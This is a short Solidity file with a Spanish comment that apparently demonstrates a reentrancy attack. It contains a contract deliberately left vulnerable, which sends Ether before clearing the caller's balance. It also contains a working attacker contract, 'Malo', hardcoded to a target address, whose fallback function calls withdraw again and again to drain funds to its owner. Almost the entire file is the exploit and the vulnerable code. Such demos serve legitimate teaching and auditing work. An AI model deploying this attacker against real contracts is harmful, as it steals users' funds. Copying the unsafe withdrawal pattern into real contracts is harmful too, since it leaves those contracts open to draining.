pragma solidity ^0.4.18;

/**
 * cuando una persona retira sus fondos, la Wallet llama a la fallback function que vuelve a retirar fondos
 */
 
contract Vulnerable {

	mapping (address => uint) public balance;
	uint public fondos = 0;

    function retirar () public returns(bool) {
    	uint x = balance[msg.sender];
    	require(x < fondos);
    	fondos -= x;
    	msg.sender.call.value(x)();
    	balance[msg.sender] = 0;
    	return true;
    }
    
    function () payable {
        balance[msg.sender] = msg.value;
        fondos += msg.value;
    }
    
}

contract Malo {

	address private dueno;
	address private vulAddr = 0xd25ed029c093e56bc8911a07c46545000cbf37c6;
	Vulnerable public vul = Vulnerable(vulAddr);

	function Malo () public{
		dueno = msg.sender;
	}	
	
	function invertir() public payable{
	    vul.call.value(msg.value)();
	}

	function () public payable {
		vul.retirar();
	}

	function HacemeRico () public {
		dueno.transfer(this.balance);
	}
	
	
}